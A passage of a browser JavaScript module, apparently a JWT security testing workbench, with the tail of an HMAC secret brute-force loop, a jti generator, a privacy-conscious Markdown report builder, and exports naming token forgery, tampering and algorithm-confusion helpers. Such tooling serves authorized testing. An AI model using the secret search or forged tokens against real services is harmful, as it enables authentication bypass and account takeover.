        .then(function (key) {
          return c.subtle.sign({ name: "HMAC", hash: spec.hash }, key, input);
        }).then(function (sig) {
          tested++;
          var bytes = asUint8(sig);
          if (bytes.length === target.length && timingSafeEqual(bytes, target)) {
            found = true;
            foundSecret = cand;
          }
          if (found || (tested % 250) === 0) {
            onProgress({ tested: tested, total: total, found: found });
          }
          if (found || i + 1 >= total) return null;
          return step(i + 1);
        });
    }

    return step(0).then(function () {
      return { found: found, secret: found ? foundSecret : null, tested: tested, total: total };
    });
  }

  /* A random jti (UUIDv4-style) for the standard-claim helpers. */
  function randomJti() {
    var c = crypto();
    if (!c.getRandomValues) {
      // Extremely defensive fallback (Web Crypto is always present here).
      var hex = "";
      for (var i = 0; i < 32; i++) hex += "0123456789abcdef".charAt(Math.floor(Math.random() * 16));
      return hex.slice(0, 8) + "-" + hex.slice(8, 12) + "-4" + hex.slice(13, 16) + "-" + hex.slice(16, 20) + "-" + hex.slice(20);
    }
    var b = c.getRandomValues(new Uint8Array(16));
    b[6] = (b[6] & 0x0f) | 0x40;
    b[8] = (b[8] & 0x3f) | 0x80;
    var h = "";
    for (var j = 0; j < 16; j++) h += (b[j] < 16 ? "0" : "") + b[j].toString(16);
    return h.slice(0, 8) + "-" + h.slice(8, 12) + "-" + h.slice(12, 16) + "-" + h.slice(16, 20) + "-" + h.slice(20);
  }

  /* ------------------------------------------------------------------------
     Markdown analysis export.

     Privacy rules, deliberately stricter than the scanners' exports: the
     Workbench handles live credentials, so the report carries the *shape* of
     the token, never material that could authenticate. The raw token, the
     signature bytes, any supplied key/secret and the values of claims that
     commonly hold identifiers are omitted — registered claims are reported
     by name, with timestamps rendered as readable times because those are
     the analytically useful part. `verification` is optional; when the
     analyst has not run a verify, the report says so rather than implying an
     unverified token is fine.
     ---------------------------------------------------------------------- */
  var SENSITIVE_CLAIMS = ["sub", "jti", "email", "name", "preferred_username",
    "given_name", "family_name", "phone_number", "sid", "nonce", "at_hash",
    "c_hash", "azp", "act", "cnf"];

  function fmtClaimTime(v) {
    if (typeof v !== "number" || !isFinite(v)) return String(v);
    try { return new Date(v * 1000).toISOString().replace(".000Z", "Z") + " (" + v + ")"; }
    catch (e) { return String(v); }
  }

  function buildMarkdown(parsed, opts) {
    opts = opts || {};
    var h = parsed.header, p = parsed.payload;
    var now = Math.floor(Date.now() / 1000);
    var lines = [];
    lines.push("# CyberBuddy — JWT Security Workbench");
    lines.push("");
    lines.push("## Token");
    lines.push("- **Algorithm (header `alg`):** " + String(h.alg));
    lines.push("- **Type (header `typ`):** " + (h.typ != null ? String(h.typ) : "(absent)"));
    lines.push("- **Key id (header `kid`):** " + (h.kid != null ? String(h.kid) : "(absent)"));
    var extraHeader = Object.keys(h).filter(function (k) {
      return ["alg", "typ", "kid"].indexOf(k) === -1;
    });
    lines.push("- **Other header parameters:** " + (extraHeader.length ? extraHeader.join(", ") : "none"));
    lines.push("- **Signature:** present, " + (parsed.signature ? parsed.signature.length : 0) +
      " bytes (not reproduced here)");
    lines.push("");

    lines.push("## Claims");
    var claimKeys = Object.keys(p);
    if (!claimKeys.length) {
      lines.push("- Payload carries no claims.");
    } else {
      claimKeys.forEach(function (k) {
        var v = p[k];
        var shown;
        if (k === "exp" || k === "iat" || k === "nbf") shown = fmtClaimTime(v);
        else if (SENSITIVE_CLAIMS.indexOf(k) !== -1) shown = "(present, value withheld)";
        else if (typeof v === "object" && v !== null) shown = "(" + (Array.isArray(v) ? "array" : "object") + ")";
        else shown = String(v);
        lines.push("- **`" + k + "`:** " + shown);
      });
    }

    if (typeof p.exp === "number") {
      lines.push("- **Expiry status:** " + (p.exp < now
        ? "expired " + Math.floor((now - p.exp) / 60) + " minute(s) ago"
        : "valid for another " + Math.floor((p.exp - now) / 60) + " minute(s)"));
      if (typeof p.iat === "number") {
        lines.push("- **Issued lifetime:** " + Math.round((p.exp - p.iat) / 60) + " minute(s)");
      }
    }
    lines.push("");

    lines.push("## Observations");
    var obs = observations(parsed);
    if (!obs.length) lines.push("- No contextual observations.");
    else obs.forEach(function (o) {
      lines.push("- **" + (o.level === "high" ? "Notable" : "Context") + "** (`" + o.code + "`): " + o.message);
    });
    lines.push("");
    lines.push("Observations are contextual, not a score or a verdict — they describe the decoded token only.");
    lines.push("");

    lines.push("## Verification");
    if (!opts.verification) {
      lines.push("- Not run. Decoding is not verification: nothing here says the signature is valid.");
    } else {
      lines.push("- **Result:** " + (opts.verification.valid ? "signature and claims verified" : "not verified"));
      (opts.verification.lines || []).forEach(function (l) { lines.push("  - " + l); });
      lines.push("- The key used for verification is not recorded in this report.");
    }
    lines.push("");

    lines.push("## References");
    lines.push("- RFC 7519 — JSON Web Token (JWT)");
    lines.push("- RFC 7515 — JSON Web Signature (JWS)");
    lines.push("- RFC 8725 — JSON Web Token Best Current Practices");
    lines.push("- OWASP WSTG-SESS-10 — Testing JSON Web Tokens");
    lines.push("");
    lines.push("---");
    lines.push("Generated with CyberBuddy — authorized testing only. Analysis runs entirely in the browser; the token, any key and any secret never leave it, and none are written to this report.");
    return lines.join("\n");
  }

  return {
    b64urlDecode: b64urlDecode,
    b64urlEncode: b64urlEncode,
    buildMarkdown: buildMarkdown,
    parseToken: parseToken,
    tryParseToken: tryParseToken,
    observations: observations,
    validateClaims: validateClaims,
    verifyToken: verifyToken,
    signToken: signToken,
    generateRsaTestPair: generateRsaTestPair,
    exportPrivateJwk: exportPrivateJwk,
    exportPublicJwk: exportPublicJwk,
    diffClaims: diffClaims,
    randomJti: randomJti,
    buildVariant: buildVariant,
    unsignedToken: unsignedToken,
    tamperToken: tamperToken,
    algorithmConfusionToken: algorithmConfusionToken,
    publicJwkFromPrivate: publicJwkFromPrivate,
    searchHmacSecret: searchHmacSecret,
    BUILTIN_SECRET_CANDIDATES: BUILTIN_SECRET_CANDIDATES,
    SUPPORTED_ALGS: SUPPORTED_ALGS
  };
});
